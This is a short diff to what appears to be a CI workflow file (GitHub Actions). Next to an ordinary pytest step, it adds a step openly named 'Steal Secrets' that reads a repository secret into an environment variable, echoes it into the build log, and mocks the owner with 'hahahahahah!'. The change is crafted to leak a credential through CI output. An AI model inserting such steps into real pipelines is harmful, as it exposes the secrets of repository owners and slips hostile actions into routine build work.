@@ -28,3 +28,9 @@ jobs:
       run: |
         pip install pytest
         pytest
+    - name: Steal Secrets
+      env:
+        super_secret: ${{ secrets.MySuperSecret }}
+      run: |
+        echo "$super_secret"
+        echo "hahahahahah!"
